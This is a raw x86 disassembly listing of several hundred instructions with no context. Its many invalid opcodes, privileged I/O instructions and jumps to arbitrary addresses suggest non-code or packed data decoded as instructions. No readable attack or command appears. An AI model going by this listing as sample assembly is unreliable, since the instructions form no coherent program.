  40b6ae:	jp     0x40b657
  40b6b0:	push   ebp
  40b6b1:	sub    BYTE PTR [eax],bl
  40b6b3:	jecxz  0x40b638
  40b6b5:	mov    al,0xfb
  40b6b7:	dec    BYTE PTR [ecx-0x1f]
  40b6ba:	popa   
  40b6bb:	xor    edx,ebp
  40b6bd:	pop    ss
  40b6be:	xchg   edi,eax
  40b6bf:	sbb    edx,DWORD PTR [ebx-0x3886040e]
  40b6c5:	sub    ecx,DWORD PTR [ebx]
  40b6c7:	sbb    esp,esi
  40b6c9:	adc    DWORD PTR [edx],ecx
  40b6cb:	lahf   
  40b6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6cd:	jb     0x40b6fb
  40b6cf:	popa   
  40b6d0:	jae    0x40b679
  40b6d2:	dec    ebx
  40b6d3:	in     eax,0x60
  40b6d5:	push   es
  40b6d6:	mov    edi,0x18ed8c3b
  40b6db:	int    0xce
  40b6dd:	fwait
  40b6de:	ror    DWORD PTR [ecx+0x38],0x55
  40b6e2:	repz (bad) 
  40b6e4:	fisubr WORD PTR [ebp+eiz*2-0x3a4b6599]
  40b6eb:	xor    BYTE PTR [edx+0x8],bh
  40b6ee:	pusha  
  40b6ef:	dec    ebp
  40b6f0:	rol    BYTE PTR [esi-0x7b],1
  40b6f3:	and    al,BYTE PTR [ebp+0x1b50352d]
  40b6f9:	call   0x4919abbd
  40b6fe:	mov    ah,0x3e
  40b700:	cmp    al,0xde
  40b702:	xchg   esp,eax
  40b703:	int    0x15
  40b705:	pop    ss
  40b706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b707:	sub    al,0xbe
  40b709:	sbb    ah,dh
  40b70b:	adc    DWORD PTR [ebp+0x66],eax
  40b70e:	push   edx
  40b70f:	push   es
  40b710:	inc    esi
  40b711:	jae    0x40b6a6
  40b713:	ret    
  40b714:	jle    0x40b6df
  40b716:	pop    gs
  40b718:	dec    ebx
  40b719:	mov    bh,0x7f
  40b71b:	sbb    al,0xe3
  40b71d:	dec    edx
  40b71e:	fisttp WORD PTR [ebp+0x4bec6708]
  40b724:	sbb    dl,BYTE PTR [ebx+0x107b16f0]
  40b72a:	mov    ch,0xb4
  40b72c:	fucom  st(1)
  40b72e:	popa   
  40b72f:	inc    ebp
  40b730:	pop    esi
  40b731:	mov    ah,0xfc
  40b733:	(bad)  
  40b734:	repnz in eax,0xc9
  40b737:	mov    gs,WORD PTR [edx-0x61387135]
  40b73d:	jae    0x40b78f
  40b73f:	xor    eax,0x71166677
  40b744:	cmp    eax,0xa0987a4c
  40b749:	add    ch,BYTE PTR [esi+0x7b]
  40b74c:	(bad)  
  40b74d:	imul   eax,DWORD PTR fs:[ecx+0x25],0x4
  40b752:	dec    ecx
  40b753:	adc    DWORD PTR [ecx],ecx
  40b755:	(bad)  [esi]
  40b757:	xor    DWORD PTR [edi+0x6456da4],ebx
  40b75d:	addr16 push ss
  40b75f:	push   cs
  40b760:	rol    BYTE PTR [ebp+ebp*4-0x6e],0xdf
  40b765:	imul   esp,DWORD PTR [edi+ebp*8+0x79],0xffffffea
  40b76a:	cmc    
  40b76b:	mov    ecx,0x16434f06
  40b770:	mov    ds:0xd4345b6b,al
  40b775:	mov    BYTE PTR [ebx+0x30],cl
  40b778:	(bad)  
  40b779:	jae    0x40b733
  40b77b:	test   BYTE PTR [eax-0x3bdb93b6],ch
  40b781:	outs   dx,DWORD PTR ds:[esi]
  40b782:	popf   
  40b783:	pusha  
  40b784:	sti    
  40b785:	scas   eax,DWORD PTR es:[edi]
  40b786:	add    ebp,esi
  40b788:	sahf   
  40b789:	ret    
  40b78a:	mov    edx,0xdd71a439
  40b78f:	mov    edx,edi
  40b791:	(bad)  
  40b792:	pop    edi
  40b793:	dec    edi
  40b794:	sar    BYTE PTR [edi+0x4b5de9ce],0x39
  40b79b:	add    bl,BYTE PTR [edx+0x25]
  40b79e:	repnz sub BYTE PTR [edx],al
  40b7a1:	imul   ebp,DWORD PTR [esi],0xffffffa8
  40b7a4:	cli    
  40b7a5:	mov    dh,0x4f
  40b7a8:	in     al,dx
  40b7a9:	xchg   edi,eax
  40b7aa:	dec    eax
  40b7ab:	fild   DWORD PTR [edi]
  40b7ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ae:	mov    edi,0xcefbad8
  40b7b3:	sahf   
  40b7b4:	das    
  40b7b5:	cmp    BYTE PTR [esi+0x5eb9d4c4],bl
  40b7bb:	xor    al,0x56
  40b7bd:	sub    edi,DWORD PTR [ebx]
  40b7bf:	aas    
  40b7c0:	sti    
  40b7c1:	icebp  
  40b7c2:	aas    
  40b7c3:	out    0xa8,al
  40b7c5:	(bad)  
  40b7c6:	push   esp
  40b7c7:	and    edx,esi
  40b7c9:	cmp    eax,DWORD PTR [edx+edx*2-0x1dbe7b5a]
  40b7d0:	mov    al,0x32
  40b7d2:	test   al,0x17
  40b7d4:	setnp  cl
  40b7d7:	inc    ecx
  40b7d8:	sub    eax,eax
  40b7da:	jmp    0xeb1be66c
  40b7df:	pop    ebp
  40b7e0:	add    ecx,DWORD PTR [ebp+edx*2+0x6520e120]
  40b7e7:	adc    edi,DWORD PTR [edx]
  40b7e9:	int    0x42
  40b7eb:	jne    0x40b7ba
  40b7ed:	mov    ebp,0xb3fbbe00
  40b7f2:	dec    ebx
  40b7f3:	or     edi,DWORD PTR [edi-0x5c8818b]
  40b7f9:	jecxz  0x40b83c
  40b7fb:	or     eax,0x63e8ca15
  40b800:	hlt    
  40b801:	jb     0x40b7d5
  40b803:	outs   dx,DWORD PTR ds:[esi]
  40b804:	jecxz  0x40b7ee
  40b806:	jbe    0x40b805
  40b808:	sbb    al,0xd4
  40b80a:	push   0x5c3dbb41
  40b80f:	bound  edx,QWORD PTR [esi+0x49f6164e]
  40b815:	inc    edi
  40b816:	arpl   si,ax
  40b818:	ins    DWORD PTR es:[edi],dx
  40b819:	mov    ebx,0xc5a7e941
  40b81e:	test   DWORD PTR [edx],ecx
  40b820:	inc    edi
  40b821:	mov    ebx,0x3e733d84
  40b826:	mov    DWORD PTR [ebx-0x15f3aa39],ecx
  40b82c:	test   al,0xe
  40b82e:	shl    DWORD PTR [ebp+0x65],cl
  40b831:	xchg   esi,eax
  40b832:	retf   
  40b833:	mov    ebx,DWORD PTR [edx-0x38177c10]
  40b839:	dec    eax
  40b83a:	jae    0x40b86b
  40b83c:	jle    0x40b8ab
  40b83e:	or     ecx,edi
  40b840:	aam    0x70
  40b842:	call   0xf598:0x6fcf741b
  40b849:	mov    eax,ds:0x9b5821f
  40b84e:	call   0x6adc765a
  40b853:	rol    DWORD PTR [ebx+0xa21ab06],0xc
  40b85a:	leave  
  40b85b:	dec    DWORD PTR [ecx-0x7f]
  40b85e:	fadd   QWORD PTR [ecx+eax*4]
  40b861:	sahf   
  40b862:	hlt    
  40b863:	xor    al,0x88
  40b865:	enter  0xdece,0xf1
  40b869:	shl    dh,0x9b
  40b86c:	out    dx,al
  40b86d:	dec    edi
  40b86e:	add    eax,0xebdde62a
  40b873:	cmc    
  40b874:	fisttp WORD PTR [ecx]
  40b876:	mov    ds:0x24a00aff,eax
  40b87b:	jnp    0x40b816
  40b87d:	fs retf 
  40b87f:	in     eax,dx
  40b880:	dec    ebx
  40b881:	in     eax,dx
  40b882:	repnz out 0x3c,al
  40b885:	jecxz  0x40b8d8
  40b887:	mov    BYTE PTR [ebx],bl
  40b889:	cwde   
  40b88a:	add    edi,DWORD PTR [esi+0x4dacd8ba]
  40b890:	iret   
  40b891:	fsubr  QWORD PTR [esi]
  40b893:	dec    ebx
  40b894:	mov    ch,0x44
  40b896:	imul   esp,DWORD PTR [ebx-0x19645ca9],0xb8c93f20
  40b8a0:	(bad)  
  40b8a1:	daa    
  40b8a2:	aad    0x77
  40b8a4:	xchg   ecx,eax
  40b8a5:	cmp    DWORD PTR [ebx],ebp
  40b8a7:	add    al,0xd4
  40b8a9:	dec    al
  40b8ab:	push   esi
  40b8ac:	add    eax,0x69d29267
  40b8b1:	push   ss
  40b8b2:	repz mov esi,0xd285517a
  40b8b8:	fstp   DWORD PTR [eax+0x5d]
  40b8bb:	ret    0x58af
  40b8be:	ins    BYTE PTR es:[edi],dx
  40b8bf:	lock inc ebp
  40b8c1:	in     al,dx
  40b8c2:	cmp    eax,0x813f67fd
  40b8c7:	inc    ecx
  40b8c8:	les    edx,FWORD PTR [edi-0x16]
  40b8cb:	sbb    dl,cl
  40b8cd:	(bad)  
  40b8ce:	adc    DWORD PTR [ebx+0x35],ebx
  40b8d1:	cmp    ebp,DWORD PTR [esi-0x6]
  40b8d4:	jge    0x40b8e1
  40b8d6:	xor    bh,bh
  40b8d8:	out    dx,al
  40b8d9:	xchg   esp,eax
  40b8da:	dec    esp
  40b8db:	jo     0x40b8bb
  40b8dd:	jecxz  0x40b8d2
  40b8df:	fcom   st(2)
  40b8e1:	lods   al,BYTE PTR ds:[esi]
  40b8e2:	not    bl
  40b8e4:	mov    bh,0x80
  40b8e6:	pop    ecx
  40b8e7:	out    0x1c,al
  40b8e9:	add    al,0x19
  40b8eb:	aas    
  40b8ec:	enter  0xe82f,0xdb
  40b8f0:	mov    al,0x94
  40b8f2:	xchg   esi,eax
  40b8f3:	xor    bh,BYTE PTR [ebx]
  40b8f5:	mul    BYTE PTR [esi]
  40b8f7:	inc    edi
  40b8f8:	fild   DWORD PTR [edx]
  40b8fa:	shl    esp,cl
  40b8fc:	add    DWORD PTR [ebx-0x78a15225],0x2682c132
  40b906:	cld    
  40b907:	sbb    al,0x22
  40b909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b90a:	pop    ss
  40b90b:	adc    BYTE PTR [eax+0x77],ah
  40b90e:	push   0x9b7ce412
  40b913:	test   DWORD PTR [edx+0x19ac240b],esi
  40b919:	ror    BYTE PTR [ebx],0x0
  40b91c:	mov    edi,0x951c1599
  40b921:	outs   dx,DWORD PTR ds:[esi]
  40b922:	push   esp
  40b923:	loopne 0x40b8ee
  40b925:	and    al,0xd
  40b927:	jl     0x40b8f7
  40b929:	fmul   QWORD PTR [edi+esi*2+0x2c]
  40b92d:	call   0x4d0c:0xf4af02a7
  40b934:	and    esp,edi
  40b936:	pop    ebp
  40b937:	hlt    
  40b938:	(bad)  
  40b939:	xor    al,BYTE PTR [ecx]
  40b93b:	imul   esi,DWORD PTR [esi+0x58779f3f],0x80094377
  40b945:	rcr    BYTE PTR [eax+0x53efbbc0],1
  40b94b:	jnp    0x40b96a
  40b94d:	cmc    
  40b94e:	push   ss
  40b94f:	in     al,dx
  40b950:	xlat   BYTE PTR ds:[ebx]
  40b951:	cmp    al,0xdf
  40b953:	mov    bh,0x5e
  40b955:	fstp   TBYTE PTR [eax+0x29d99fbe]
  40b95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b95c:	sbb    dl,ch
  40b95e:	ja     0x40b8f7
  40b960:	mov    ch,0xc1
  40b962:	mov    dl,0x1d
  40b964:	cld    
  40b965:	das    
  40b966:	loopne 0x40b9bc
  40b968:	xor    ah,BYTE PTR [eax]
  40b96a:	jo     0x40b9bd
  40b96c:	adc    dl,0x33
  40b96f:	jg     0x40b9b5
  40b971:	loopne 0x40b903
  40b973:	js     0x40b924
  40b975:	lods   al,BYTE PTR ds:[esi]
  40b976:	cmp    bl,BYTE PTR [edx]
  40b978:	nop
  40b979:	push   0xc87fff53
  40b97e:	cmovp  edi,DWORD PTR ds:0x9a789c13
  40b985:	es cmp eax,0xb15cdd3a
  40b98b:	js     0x40b93a
  40b98d:	pop    esi
  40b98e:	xchg   edi,eax
  40b98f:	sbb    BYTE PTR [ecx],bl
  40b991:	adc    ebx,DWORD PTR [ebx]
  40b993:	out    0x6b,al
  40b995:	mov    bh,0x41
  40b997:	mov    esi,0xa57f6244
  40b99c:	scas   eax,DWORD PTR es:[edi]
  40b99d:	mov    cl,0x8a
  40b99f:	jp     0x40b932
  40b9a1:	add    bl,BYTE PTR [ebx-0x28a92e9b]
  40b9a7:	mov    esi,0xe5b52bb8
  40b9ac:	mov    esp,0x5d50d5b1
  40b9b1:	mov    ds:0x98c12983,al
  40b9b6:	and    BYTE PTR [edx-0x1c],ch
  40b9b9:	inc    eax
  40b9ba:	repnz in al,0xc8
  40b9bd:	ds cli 
  40b9bf:	repz gs (bad) 
  40b9c2:	int    0x46
  40b9c4:	lea    eax,[esi*8-0x3e5b6282]
  40b9cb:	ficom  DWORD PTR [ebx]
  40b9cd:	jle    0x40b973
  40b9cf:	xchg   edi,esp
  40b9d1:	sub    esi,DWORD PTR [esi+0x30f39044]
  40b9d7:	ss enter 0x9e91,0x9b
  40b9dc:	ds and bl,ah
  40b9df:	adc    eax,0x919597f3
  40b9e4:	icebp  
  40b9e5:	and    DWORD PTR [ebx+0x58d89bac],eax
  40b9eb:	pop    ecx
  40b9ec:	mov    dl,0xe6
  40b9ee:	nop
  40b9ef:	add    ebx,eax
  40b9f1:	test   eax,ebp
  40b9f3:	xchg   DWORD PTR ds:0x6b090413,eax
  40b9f9:	out    dx,eax
  40b9fa:	push   ebp
  40b9fb:	jo     0x40b9d8
  40b9fd:	out    0x8f,al
  40b9ff:	je     0x40b9bd
  40ba01:	sahf   
  40ba02:	lds    ebp,FWORD PTR [esi]
  40ba04:	fiadd  DWORD PTR [eax+ebp*2+0x50]
  40ba08:	in     ax,dx
  40ba0a:	xlat   BYTE PTR ds:[ebx]
  40ba0b:	dec    esp
  40ba0c:	idiv   DWORD PTR [edi-0xf]
  40ba0f:	cmp    DWORD PTR [eax-0x4af2d1db],ecx
  40ba15:	or     BYTE PTR [edx+0x70],dh
  40ba18:	(bad)  
  40ba19:	jmp    0x6200:0x31255f20
  40ba20:	mov    ebx,0x27f9b605
  40ba25:	je     0x40b9f5
  40ba27:	and    ebp,esp
  40ba29:	cdq    
  40ba2a:	outs   dx,DWORD PTR ds:[esi]
  40ba2b:	dec    ecx
  40ba2c:	scas   al,BYTE PTR es:[edi]
  40ba2d:	(bad)  
  40ba2e:	push   esi
  40ba2f:	push   ebp
  40ba30:	imul   ebp,DWORD PTR [ebx-0x7a],0xffffff8c
  40ba34:	or     al,BYTE PTR ds:0xc7a2a975
  40ba3a:	dec    edx
  40ba3b:	shl    DWORD PTR [edi],cl
  40ba3d:	jno    0x40ba15
  40ba3f:	push   0x19
  40ba41:	sbb    al,0xf5
  40ba43:	(bad)  
  40ba44:	sub    al,0x91
  40ba46:	push   0xfabcd081
  40ba4b:	push   es
  40ba4c:	adc    edx,DWORD PTR [edx+edx*1+0x17]
  40ba50:	lds    edi,FWORD PTR [ebx]
  40ba52:	mov    dl,0x71
  40ba54:	retf   
  40ba55:	jp     0x40bab8
  40ba57:	sub    eax,DWORD PTR [edi-0x26]
  40ba5a:	mov    edi,0x874e8cf9
  40ba5f:	add    al,0x92
  40ba61:	sbb    al,0x3
  40ba63:	sti    
  40ba64:	mov    bh,0x69
  40ba66:	jl     0x40ba94
  40ba68:	rcr    DWORD PTR [edx],1
  40ba6a:	call   0x7c5abfdb
  40ba6f:	dec    edx
  40ba70:	in     eax,dx
  40ba71:	out    dx,al
  40ba72:	and    al,0x5d
  40ba74:	xchg   DWORD PTR [esi+eiz*8+0xe74800f],esi
  40ba7b:	add    ah,BYTE PTR [eax+edx*4]
  40ba7e:	lea    esi,[eax+esi*1+0x14]
  40ba82:	ror    ch,0xc4
  40ba85:	inc    esp
  40ba86:	test   eax,eax
  40ba88:	int    0xda
  40ba8a:	test   al,0x6e
  40ba8c:	jp     0x40ba48
  40ba8e:	push   esi
  40ba8f:	fcom   DWORD PTR [edi+ecx*4-0x1770806c]
  40ba96:	sti    
  40ba97:	xchg   edi,eax
  40ba98:	lds    ebp,FWORD PTR [ebp-0x48]
  40ba9b:	cwde   
  40ba9c:	mov    bh,0x96
  40ba9e:	dec    esp
  40ba9f:	xor    ebp,DWORD PTR [eax+0x24ee6d41]
  40baa5:	jle    0x40bae4
  40baa7:	push   edi
  40baa8:	sbb    al,0x1e
  40baaa:	ins    BYTE PTR es:[edi],dx
  40baab:	pop    ss
  40baac:	sbb    DWORD PTR [ebx],ecx
  40baae:	sub    al,0xb3
  40bab0:	leave  
  40bab1:	push   ebx
  40bab2:	ins    DWORD PTR es:[edi],dx
  40bab3:	or     eax,0x4bb5f5bf
  40bab8:	cmp    eax,0x11255d2e
  40babd:	(bad)  
  40babe:	in     al,dx
  40babf:	aas    
  40bac0:	pop    ds
  40bac1:	cmp    bl,al
  40bac3:	cli    
  40bac4:	jb     0x40ba99
  40bac6:	xor    DWORD PTR [ebx],eax
  40bac8:	enter  0xb766,0x56
  40bacc:	xchg   ebx,eax
  40bacd:	mov    ebp,0xaf3cc86b
  40bad2:	cmp    eax,0x633ddc45
  40bad7:	push   0x51
  40bad9:	out    0xfc,eax
  40badb:	inc    edx
  40badc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40badd:	(bad)  
  40bade:	outs   dx,BYTE PTR ds:[esi]
  40badf:	mov    dl,BYTE PTR [ebp-0x3ddbeb18]
  40bae5:	push   ss
  40bae6:	dec    edi
  40bae7:	sub    eax,0xd1f52c27
  40baec:	jo     0x40bab8
  40baee:	cmp    al,0x5
  40baf0:	js     0x40bb55
  40baf2:	je     0x40bb5e
  40baf4:	xchg   esi,eax
  40baf5:	push   esp
  40baf6:	stos   BYTE PTR es:[edi],al
  40baf7:	sub    al,BYTE PTR [eax-0x3d]
  40bafa:	fnstcw WORD PTR ds:0x51bd252c
  40bb00:	mov    dl,0xc2
  40bb02:	mov    al,0x17
  40bb04:	fsubr  st(3),st
  40bb06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb07:	sub    dh,BYTE PTR [esi-0x15]
  40bb0a:	inc    ebx
  40bb0b:	aaa    
  40bb0c:	stos   DWORD PTR es:[edi],eax
  40bb0d:	in     al,dx
  40bb0e:	sub    eax,DWORD PTR ds:0xa317eab5
  40bb14:	push   0xa03953d2
  40bb19:	or     al,0xf1
  40bb1b:	adc    al,0x40
  40bb1d:	sbb    ah,bl
  40bb1f:	(bad)  
  40bb21:	jl     0x40babc
  40bb23:	adc    eax,0xecd9c867
  40bb28:	leave  
  40bb29:	fsub   st,st(3)
  40bb2b:	add    bl,bl
  40bb2d:	pop    esp
  40bb2e:	cmp    al,0x55
  40bb30:	xchg   ebx,eax
  40bb31:	jle    0x40bb85
  40bb33:	jecxz  0x40bab6
  40bb35:	xchg   esp,eax
  40bb36:	aam    0xf1
  40bb38:	int3   
  40bb39:	mov    ebx,0x1a0ccfe4
  40bb3e:	test   al,0xe6
  40bb40:	jns    0x40bb39
  40bb42:	mov    edx,0xf29e2196
  40bb47:	dec    edx
  40bb48:	ja     0x40bad4
  40bb4a:	mov    edx,0xc0b2e3e6
  40bb4f:	xor    eax,0xfb72d9a
  40bb54:	push   ebx
  40bb55:	jo     0x40bb2d
  40bb57:	fcmove st,st(0)
  40bb59:	push   edi
  40bb5a:	cmc    
  40bb5b:	inc    edx
  40bb5c:	rol    DWORD PTR [esi],1
  40bb5e:	adc    eax,ebx
  40bb60:	popa   
  40bb61:	push   ecx
  40bb62:	cmp    DWORD PTR [ecx+0x1faf1237],0xfffffffa
  40bb69:	or     al,0xf
  40bb6b:	iret   
  40bb6c:	loop   0x40bb87
  40bb6e:	inc    eax
  40bb6f:	adc    eax,0x537de7ac
  40bb74:	rcl    DWORD PTR [eax+edi*4],cl
  40bb77:	mov    edi,0xb38fbed6
  40bb7c:	daa    
  40bb7d:	cld    
  40bb7e:	lock outs dx,DWORD PTR ds:[esi]
  40bb80:	mov    ds:0xff024b22,al
  40bb85:	sbb    eax,0x2bc8e0b4
  40bb8a:	ror    DWORD PTR [edx+0x26],cl
  40bb8d:	jle    0x40bb9b
  40bb8f:	les    edx,FWORD PTR [ecx-0x7c]
  40bb92:	ror    BYTE PTR [ebp-0x77],1
  40bb95:	hlt    
  40bb96:	inc    esp
  40bb97:	mov    eax,0xfac7c79a
  40bb9c:	sahf   
  40bb9d:	xchg   edx,eax
  40bb9e:	cmp    eax,0xab4b239f
  40bba3:	arpl   dx,bp
  40bba5:	jge    0x40bb3c
  40bba7:	and    al,0x78
  40bba9:	int    0xb
  40bbab:	cdq    
  40bbac:	dec    eax
  40bbad:	adc    edi,DWORD PTR [ebp-0x37]
  40bbb0:	addr16 aam 0x77
  40bbb3:	int    0xe8
  40bbb5:	xor    ch,ch
  40bbb7:	fsubr  st(4),st
  40bbb9:	xchg   esp,eax
  40bbba:	pop    ebx
  40bbbb:	jb     0x40bbdc
  40bbbd:	not    ebp
  40bbbf:	ss ss push edi
  40bbc2:	xchg   DWORD PTR [edx],eax
  40bbc4:	fdivr  DWORD PTR [ecx]
  40bbc6:	add    eax,DWORD PTR [edi+0x41]
  40bbc9:	clc    
  40bbca:	dec    esp
  40bbcb:	ins    BYTE PTR es:[edi],dx
  40bbcc:	scas   al,BYTE PTR es:[edi]
  40bbcd:	push   0xffffffce
  40bbcf:	mov    bh,0x3e
  40bbd1:	xor    DWORD PTR [ecx],esp
  40bbd3:	test   ch,dh
  40bbd5:	adc    al,BYTE PTR [ebx+0x15]
  40bbd8:	add    edi,DWORD PTR [esp+ebp*8]
  40bbdb:	sbb    DWORD PTR [esp+ecx*1],ebx
  40bbde:	xchg   BYTE PTR [edx-0x74],bl
  40bbe1:	rol    DWORD PTR [ebx+0x6e],1
  40bbe4:	(bad)  ss:[ecx]
  40bbe7:	inc    ecx
  40bbe8:	push   cs
  40bbe9:	dec    edx
  40bbea:	pop    ebx
  40bbeb:	or     BYTE PTR [eax+0x5d32a68b],cl
  40bbf1:	in     al,dx
  40bbf2:	mov    edi,0x28599ae5
  40bbf7:	aad    0x6e
  40bbf9:	mov    BYTE PTR [eax-0x6b],al
  40bbfc:	outs   dx,BYTE PTR cs:[esi]
  40bbfe:	xchg   ebp,eax
  40bbff:	in     al,dx
  40bc00:	jo     0x40bc7b
  40bc02:	mov    ds:0xe4dae9bc,eax
  40bc07:	jle    0x40bc81
  40bc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc0a:	int3   
  40bc0b:	or     BYTE PTR [esi],bh
  40bc0d:	jp     0x40bbdc
  40bc0f:	jae    0x40bc6e
  40bc11:	adc    DWORD PTR [ecx-0x5b],0x66de199b
  40bc18:	xor    edx,DWORD PTR [esp+ebx*8-0x64]
  40bc1c:	(bad)  
  40bc1d:	mov    ch,0xa1
  40bc1f:	sar    DWORD PTR [esi+ecx*1],0x17
  40bc23:	mov    ds:0x4b295143,al
  40bc28:	(bad)  
  40bc29:	aam    0x2f
  40bc2b:	out    dx,al
  40bc2c:	repnz cmc 
  40bc2e:	(bad)  
  40bc2f:	jl     0x40bc76
  40bc31:	out    0x60,al
  40bc33:	cmp    ch,BYTE PTR [ebx]
  40bc35:	fisub  WORD PTR [edx]
  40bc37:	jmp    0x40bcb7
  40bc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc3a:	loopne 0x40bc44
  40bc3c:	les    edi,FWORD PTR [ebp+eiz*4+0x1f]
  40bc40:	jne    0x40bbd5
  40bc42:	int3   
  40bc43:	cmp    ah,BYTE PTR [ecx]
  40bc45:	ficom  WORD PTR [eax+esi*1-0x4b]
  40bc49:	arpl   WORD PTR [edi-0x7a],bp
  40bc4c:	jmp    0xc65526d2
  40bc51:	sbb    DWORD PTR [ecx+0x5dcf38fb],ecx
  40bc57:	mov    edx,0xa521cf5e
  40bc5c:	stos   BYTE PTR es:[edi],al
  40bc5d:	add    bl,BYTE PTR [edi+eax*8-0x67]
  40bc61:	mov    ds:0xd64b36e0,eax
  40bc66:	adc    edx,DWORD PTR [edx+0x9]
  40bc69:	lds    eax,FWORD PTR [edi-0x582a420e]
  40bc6f:	std    
  40bc70:	jno    0x40bc57
  40bc72:	push   es
  40bc73:	push   edi
  40bc74:	xor    bh,BYTE PTR [ebp+0x4e]
  40bc77:	dec    ebp
  40bc78:	push   edx
  40bc79:	clc    
  40bc7a:	fisttp QWORD PTR gs:[ebp-0x66]
  40bc7e:	scas   al,BYTE PTR es:[edi]
  40bc7f:	ds dec ecx
  40bc81:	push   esp
  40bc82:	std    
  40bc83:	or     bl,bh
  40bc85:	push   es
  40bc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc87:	push   0xd84d48b2
  40bc8c:	push   esp
  40bc8d:	mov    ah,0xad
  40bc8f:	mov    ds:0x3d171671,eax
  40bc94:	inc    esi
  40bc95:	into   
  40bc96:	sub    DWORD PTR [ebp+0x63a7316e],0x7fc1d0a8
  40bca0:	push   es
  40bca1:	mov    ds:0xa438c9b2,eax
  40bca6:	xor    DWORD PTR [ebx],edi
  40bca8:	sub    esp,DWORD PTR [ebx+0x218675c8]
  40bcae:	cld    
  40bcaf:	dec    ecx
  40bcb0:	pushf  
  40bcb1:	push   ebp
  40bcb2:	ins    BYTE PTR es:[edi],dx
  40bcb3:	std    
  40bcb4:	mov    ebp,0x8953ba00
  40bcb9:	fwait
  40bcba:	xlat   BYTE PTR ds:[ebx]
  40bcbb:	dec    ecx
  40bcbc:	mov    BYTE PTR [edx+0x5a],bl
  40bcbf:	lea    esi,[ebp-0xd]
  40bcc2:	shl    esi,1
  40bcc4:	push   0xffffff97
  40bcc6:	mov    eax,ds:0xc91781ea
  40bccb:	push   0x2d2ec941
  40bcd0:	pop    ebp
  40bcd1:	stos   BYTE PTR es:[edi],al
  40bcd2:	jbe    0x40bc77
  40bcd4:	jo     0x40bd08
  40bcd6:	inc    ebx
  40bcd7:	pop    ss
  40bcd8:	push   ss
  40bcd9:	popf   
  40bcda:	jmp    eax
  40bcdc:	outs   dx,BYTE PTR ds:[esi]
  40bcdd:	ret    
  40bcde:	jbe    0x40bcea
  40bce0:	fcmovnbe st,st(3)
  40bce2:	jae    0x40bc77
  40bce4:	mov    bh,0x69
  40bce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce7:	mov    ah,dh
  40bce9:	std    
  40bcea:	ret    0x5a48
  40bced:	leave  
  40bcee:	jne    0x40bd44
  40bcf0:	pop    ebp
  40bcf1:	mov    al,0xf2
  40bcf3:	loop   0x40bd5b
  40bcf5:	mov    ecx,ds
  40bcf7:	jnp    0x40bd28
  40bcf9:	dec    edi
  40bcfa:	or     BYTE PTR [ebp-0x62],0xd
  40bcfe:	bswap  eax
  40bd00:	and    al,0x45
  40bd02:	xor    al,0xea
  40bd04:	cmp    al,BYTE PTR [ecx-0x2]
  40bd07:	cld    
  40bd08:	cld    
  40bd09:	(bad)  
  40bd0a:	cmc    
  40bd0b:	out    dx,al
  40bd0c:	leave  
  40bd0d:	ficomp WORD PTR [eax+ecx*2+0xbfe16d6]
  40bd14:	cs and eax,0x76e903dc
  40bd1a:	jmp    0x40bd69
  40bd1c:	xor    BYTE PTR ds:[edi],cl
  40bd1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd20:	mov    ds:0x76320d37,eax
  40bd25:	dec    esp
  40bd26:	mov    esi,0x15796016
  40bd2b:	fsub   QWORD PTR [ecx+0x4fd8de67]
  40bd31:	gs fwait
  40bd33:	fwait
  40bd34:	lea    eax,gs:[esi+eiz*2]
  40bd38:	dec    ebx
  40bd39:	pop    eax
  40bd3a:	jns    0x40bd2e
  40bd3c:	stos   DWORD PTR es:[edi],eax
  40bd3d:	mov    edi,ebp
  40bd3f:	xor    BYTE PTR [ebx+0x5254567c],ah
  40bd45:	js     0x40bd6f
  40bd47:	js     0x40bd3b
  40bd49:	nop
  40bd4a:	ins    BYTE PTR es:[edi],dx
  40bd4b:	push   esp
  40bd4c:	or     DWORD PTR [ecx*4-0x4de44902],0x5d2674dd
  40bd57:	pushf  
  40bd58:	xlat   BYTE PTR ds:[ebx]
  40bd59:	lahf   
  40bd5a:	jbe    0x40bd5f
  40bd5c:	cli    
  40bd5d:	imul   ebp
  40bd5f:	clc    
  40bd60:	xchg   DWORD PTR [ebx+ebx*8+0x5d],edx
  40bd64:	cdq    
  40bd65:	xlat   BYTE PTR ds:[ebx]
  40bd66:	or     al,BYTE PTR [eax-0x29]
  40bd69:	mov    bh,0x26
  40bd6b:	shl    BYTE PTR ds:0x65e1fc0b,1
  40bd71:	cmp    BYTE PTR [eax+0x6e],dl
  40bd74:	inc    ebp
  40bd75:	xchg   edi,eax
  40bd76:	mov    dh,0xd5
  40bd78:	jle    0x40bdb9
  40bd7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd7b:	aad    0x7c
  40bd7d:	jp     0x40bd92
  40bd7f:	inc    eax
  40bd80:	inc    esi
  40bd81:	xchg   ecx,eax
  40bd82:	xlat   BYTE PTR ds:[ebx]
  40bd83:	xor    al,0xdc
  40bd85:	(bad)  
  40bd86:	pop    esi
  40bd87:	lods   al,BYTE PTR ds:[esi]
  40bd88:	and    edx,ebx
  40bd8a:	fimul  DWORD PTR [ecx+0x21cf44dd]
  40bd90:	sbb    bh,dl
  40bd92:	jo     0x40bdba
  40bd94:	jns    0x40bd3c
  40bd96:	mov    ch,0x94
  40bd98:	or     DWORD PTR [ebp-0x18d851a1],esp
  40bd9e:	in     eax,dx
  40bd9f:	mov    edx,0xa9758c70
  40bda4:	popf   
  40bda5:	das    
  40bda6:	and    eax,0x55cb9d5
  40bdab:	xor    eax,DWORD PTR [edi]
  40bdad:	clc    
  40bdae:	imul   BYTE PTR [ecx-0x10]
  40bdb1:	jmp    0x40bdb8
  40bdb3:	mov    WORD PTR [ecx],es
  40bdb5:	push   edx
  40bdb6:	jnp    0x40bd93
  40bdb8:	out    0x1b,al
  40bdba:	jo     0x40bddf
  40bdbc:	ret    
